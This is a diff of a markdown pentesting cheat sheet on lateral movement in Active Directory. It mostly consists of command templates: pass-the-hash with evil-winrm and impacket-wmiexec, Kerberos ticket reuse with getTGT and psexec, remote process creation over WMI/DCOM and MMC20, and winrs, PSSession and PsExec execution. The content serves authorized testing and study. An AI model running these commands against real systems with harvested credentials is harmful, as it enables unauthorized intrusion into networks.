@@ -1,69 +1,49 @@
 # Lateral movement checks
 
-[← Active Directory quick reference](../05-active-directory.md)
-
-Match access to open service: WMI/DCOM 135; WinRM 5985/5986; SMB exec 445 + admin + usable share. Test identity first.
+Match access to the open service: WMI/DCOM 135 · WinRM 5985/5986 · SMB exec 445 + admin + usable share. Test identity first (authentication ≠ command execution).
 
 ## Password or NT hash
-
 ```bash
-evil-winrm -i <target-ip> -u <user> -p '<password>'
-impacket-wmiexec <domain.tld>/<user>:<password>@<target-ip>
+evil-winrm -i <IP> -u <USER> -p '<PW>'
+impacket-wmiexec <DOMAIN.TLD>/<USER>:<PW>@<IP>
+evil-winrm -i <IP> -u <USER> -H <NT>
+impacket-wmiexec -hashes :<NT> <DOMAIN.TLD>/<USER>@<IP>
 ```
-
-```bash
-evil-winrm -i <target-ip> -u <user> -H <nt-hash>
-impacket-wmiexec -hashes :<nt-hash> <domain.tld>/<user>@<target-ip>
-```
-
-Pass the Hash needs NT hash + NTLM service. NetNTLMv2 is not passable.
+- Pass the Hash needs an NT hash + an NTLM service. NetNTLMv2 is not passable.
 
 ## Kerberos ticket
-
-NT hash → TGT; keep cache tied to account/domain.
-
 ```bash
-impacket-getTGT <domain.tld>/<user> -hashes :<nt-hash>
-export KRB5CCNAME=<user>.ccache
-impacket-psexec -k -no-pass <domain.tld>/<user>@<target-fqdn>
+impacket-getTGT <DOMAIN.TLD>/<USER> -hashes :<NT>
+export KRB5CCNAME=<USER>.ccache
+impacket-psexec -k -no-pass <DOMAIN.TLD>/<USER>@<FQDN>
 ```
+- Keep the cache tied to its account. TGS is SPN-specific: failure → FQDN, SPN, DNS, clock.
 
-TGS is SPN-specific. Failure: check FQDN, SPN, DNS, clock.
-
-## Direct WMI check
-
+## Direct WMI (PowerShell)
 ```powershell
-$password = ConvertTo-SecureString '<password>' -AsPlainText -Force
-$credential = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $password)
+$password = ConvertTo-SecureString '<PW>' -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $password)
 $options = New-CimSessionOption -Protocol DCOM
-$session = New-CimSession -ComputerName <target-ip> -Credential $credential -SessionOption $options
+$session = New-CimSession -ComputerName <IP> -Credential $credential -SessionOption $options
 Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = 'cmd /c hostname'}
 ```
 
-Track source → destination, account, access, result. Authentication ≠ command execution.
-
 ## Windows-side alternatives
-
-WinRS/PowerShell remoting → WinRM. PsExec → SMB + service-control access.
-
+WinRS / PS remoting → WinRM. PsExec → SMB + service-control access.
 ```cmd
-winrs -r:<target-host> -u:<domain>\<user> -p:<password> "cmd /c hostname & whoami"
+winrs -r:<FQDN> -u:<DOMAIN>\<USER> -p:<PW> "cmd /c hostname & whoami"
 ```
-
 ```powershell
-$password = ConvertTo-SecureString '<password>' -AsPlainText -Force
-$credential = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $password)
-$session = New-PSSession -ComputerName <target-host> -Credential $credential
+$password = ConvertTo-SecureString '<PW>' -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $password)
+$session = New-PSSession -ComputerName <FQDN> -Credential $credential
 Enter-PSSession $session
 ```
-
 ```powershell
-.\PsExec64.exe \\<target-host> -u <domain>\<user> -p <password> cmd
+.\PsExec64.exe \\<FQDN> -u <DOMAIN>\<USER> -p <PW> cmd
 ```
-
-DCOM/MMC: local admin + RPC; use file-output proof because process may run in session 0.
-
+DCOM/MMC (local admin + RPC; process may run in session 0 → use a file-output proof):
 ```powershell
-$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1', '<target-host>'))
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1', '<FQDN>'))
 $dcom.Document.ActiveView.ExecuteShellCommand('cmd', $null, '/c hostname > C:\Windows\Temp\dcom-check.txt', '7')
 ```
